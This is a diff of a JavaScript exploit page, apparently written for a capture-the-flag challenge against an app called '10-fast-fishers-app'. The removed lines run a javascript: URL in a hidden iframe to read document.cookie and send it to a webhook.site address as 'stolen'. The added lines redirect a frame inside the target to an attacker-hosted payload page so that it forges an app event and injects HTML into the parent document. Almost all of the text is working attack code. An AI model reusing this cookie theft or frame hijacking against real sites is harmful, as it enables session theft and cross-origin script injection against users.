@@ -8,9 +8,9 @@ console.log("PWN-START");
 // Strategy:
 // 1) Use a hidden iframe we control in OUR page.
 // 2) Load the target app into that iframe.
-// 3) After it has loaded, navigate the iframe itself to a javascript: URL.
-//    That javascript runs in the iframe's own origin (10-fast-fishers-app).
-// 4) Exfiltrate document.cookie directly.
+// 3) Navigate the iframe itself to a javascript: URL and inspect the execution
+//    context. If it runs inside the target app origin, forge FISH_CLICKED from
+//    there and let the app inject our HTML into the parent document.
 
 const target = "http://10-fast-fishers-app:5000/";
 const iframe = document.createElement("iframe");
@@ -21,27 +21,34 @@ console.log("IFRAME-APPENDED-" + target);
 
 const js = "javascript:(function(){" +
   "try{" +
-    "const c=document.cookie;" +
-    "console.log('COOKIE-VALUE:'+c);" +
-    "if(c&&c.length>0){fetch('https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad?stolen='+encodeURIComponent(c)).catch(()=>{});} " +
-  "}catch(e){console.log('COOKIE-ERR:'+e.message);} " +
+    "console.log('CTX-ORIGIN:'+location.origin);" +
+    "console.log('CTX-HREF:'+location.href);" +
+    "const frame=document.getElementById('aquariumFrame');" +
+    "console.log('CTX-FRAME:'+(!!frame));" +
+    "if(frame&&frame.contentWindow){" +
+      "frame.contentWindow.location='https://egraomire2.github.io/CTF-attacker-serv/frame_payload.html';" +
+      "console.log('AQUARIUM-REDIRECTED');" +
+    "}" +
+  "}catch(e){console.log('CTX-ERR:'+e.message);} " +
 "})()";
 
 let tries = 0;
-const leakLoop = setInterval(() => {
-  tries++;
-  try {
-    iframe.src = js;
-    console.log("IFRAME-JS-ATTEMPT-" + tries);
-  } catch (e) {
-    console.log("IFRAME-JS-ERR-" + tries + ":" + e.message);
-  }
+setTimeout(() => {
+  const leakLoop = setInterval(() => {
+    tries++;
+    try {
+      iframe.src = js;
+      console.log("CTX-ATTEMPT-" + tries);
+    } catch (e) {
+      console.log("CTX-ERR-" + tries + ":" + e.message);
+    }
 
-  if (tries >= 15) {
-    clearInterval(leakLoop);
-    console.log("PWN-DONE");
-  }
-}, 2500);
+    if (tries >= 20) {
+      clearInterval(leakLoop);
+      console.log("PWN-DONE");
+    }
+  }, 180);
+}, 900);
 
 </script>
 </body>
